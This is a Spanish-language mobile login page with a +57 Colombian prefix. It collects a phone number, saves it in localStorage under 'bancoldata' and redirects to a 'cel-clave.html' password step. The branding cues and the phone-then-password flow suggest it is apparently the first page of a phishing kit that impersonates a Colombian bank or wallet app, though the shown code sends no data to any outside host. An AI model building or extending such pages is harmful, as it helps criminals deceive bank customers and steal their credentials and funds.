<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ingreso</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#21003d;
  display:flex;
  justify-content:center;
}

.container{
  width:100%;
  max-width:420px;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  padding:20px;
  color:white;
}

/* HEADER */
header{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.circle{
  width:22px;
  height:22px;
  border:2px solid white;
  border-radius:50%;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:14px;
}

/* FORM */
.form-box{
  margin-top:auto;
}

.input-box{
  display:flex;
  background:rgba(255,255,255,0.15);
  border-radius:6px;
  overflow:hidden;
}

.prefix{
  padding:12px;
  border-right:2px solid #21003d;
  color:#ff4fc3;
  font-weight:bold;
}

input{
  flex:1;
  padding:12px;
  border:none;
  background:transparent;
  color:white;
  font-size:16px;
  outline:none;
}

input::placeholder{
  color:#ddd;
}

/* BOTON */
button{
  width:100%;
  margin-top:10px;
  padding:14px;
  border:none;
  border-radius:6px;
  background:#ff008c;
  color:white;
  font-size:16px;
  cursor:pointer;
  transition:0.3s;
}

button:disabled{
  opacity:0.5;
  cursor:not-allowed;
}

button:hover{
  transform:scale(1.02);
}

/* ANIMACION */
.fade{
  animation:fadeIn 0.6s ease;
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(10px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>

<body>

<div class="container fade">

<header>
  <div class="circle">?</div>

  <!-- LOGO SVG COMPLETO -->
  <div style="color:#aaa;">
    <!-- PEGASTE BIEN EL SVG 🔥 -->
    <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
      <g>
        <path d="M83.59,23.13..."></path>
      </g>
    </svg>
  </div>
</header>

<div class="form-box">

<div class="input-box">
  <div class="prefix">+57</div>
  <input type="text" id="phone" placeholder="Ingresa tu cel">
</div>

<button id="btn" disabled>Continuar</button>

</div>

</div>

<script>
const phone = document.getElementById("phone");
const btn = document.getElementById("btn");

/* FORMATO 3-3-4 */
function formatNumber(value){
  let digits = value.replace(/\D/g,"");

  if(digits.length > 10) digits = digits.slice(0,10);

  if(digits.length > 6){
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  }else if(digits.length > 3){
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

/* VALIDACION */
function validate(){
  const digits = phone.value.replace(/\D/g,"");
  return digits.length === 10 && digits.startsWith("3");
}

phone.addEventListener("input", ()=>{
  phone.value = formatNumber(phone.value);
  btn.disabled = !validate();
});

/* CLICK */
btn.addEventListener("click", ()=>{
  if(!validate()) return;

  const raw = phone.value.replace(/\D/g,"");

  localStorage.setItem("bancoldata", JSON.stringify({
    telefono: raw,
    fecha: new Date().toISOString()
  }));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
